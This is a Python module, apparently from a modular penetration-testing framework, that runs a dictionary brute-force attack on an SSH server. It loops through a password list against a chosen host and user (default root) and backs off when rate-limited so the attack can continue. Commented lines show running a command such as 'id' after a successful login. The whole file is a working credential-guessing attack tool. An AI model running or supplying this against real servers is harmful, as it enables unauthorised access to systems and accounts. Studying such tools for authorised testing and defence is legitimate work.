import paramiko
import time
from core.base_module import BaseModule
from rich.console import Console

class SshBruteforce(BaseModule):
    """Performs a dictionary-based brute-force attack on an SSH server."""

    def get_options(self):
        """
        Returns the options for this module.
        """
        return {
            'RHOST': ['', 'The target host IP address.'],
            'RPORT': [22, 'The target port.'],
            'USER': ['root', 'The username to authenticate as.'],
            'PASS_FILE': ['', 'Path to the password list file.'],
            'TIMEOUT': [5, 'Connection timeout in seconds.']
        }

    def run(self, options):
        """
        Executes the SSH brute-force attack.
        """
        rhost = options.get('RHOST')
        rport = int(options.get('RPORT'))
        user = options.get('USER')
        pass_file = options.get('PASS_FILE')
        timeout = int(options.get('TIMEOUT'))
        console = Console()

        if not rhost or not pass_file:
            console.print("[!] RHOST and PASS_FILE must be set.", style="bold red")
            return

        try:
            with open(pass_file, 'r', encoding='utf-8', errors='ignore') as f:
                passwords = [line.strip() for line in f]
        except FileNotFoundError:
            console.print(f"[!] Password file not found: {pass_file}", style="bold red")
            return

        console.print(f"[*] Starting SSH brute-force on {rhost}:{rport} for user '{user}'...")
        found = False

        for password in passwords:
            if found:
                break

            client = paramiko.SSHClient()
            client.set_missing_host_key_policy(paramiko.AutoAddPolicy())

            try:
                console.print(f"[*] Trying password: {password}")
                client.connect(rhost, port=rport, username=user, password=password, timeout=timeout)
                console.print(f"[bold green][+] Success! Password found: {password}[/bold green]")
                found = True
                # You could optionally run a command here
                # stdin, stdout, stderr = client.exec_command('id')
                # console.print(f"[+] Command output: {stdout.read().decode()}")
            except paramiko.AuthenticationException:
                # This is expected, just means wrong password
                pass
            except paramiko.SSHException as e:
                console.print(f"[!] SSH Error: {e}. This could be due to rate-limiting.", style="yellow")
                time.sleep(10) # Wait if we get blocked
            except Exception as e:
                console.print(f"[!] An error occurred: {e}", style="bold red")
            finally:
                client.close()

        if not found:
            console.print(f"[yellow][-] Brute-force complete. Password not found in the list.[/yellow]")
